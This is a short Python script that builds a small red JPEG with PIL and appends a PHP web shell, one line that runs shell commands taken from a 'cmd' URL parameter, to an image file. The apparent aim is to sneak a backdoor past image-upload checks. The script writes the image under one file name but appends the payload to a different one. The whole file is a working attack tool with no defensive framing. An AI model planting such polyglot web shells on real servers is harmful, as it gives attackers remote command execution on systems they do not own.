from PIL import Image


php_payload = b'<?php echo shell_exec($_GET["cmd"]); ?>'

img = Image.new('RGB', (100, 100), color='red')
img.save('exploit_image.jpg')

with open('landscape.jpg', 'ab') as f:
    f.write(php_payload)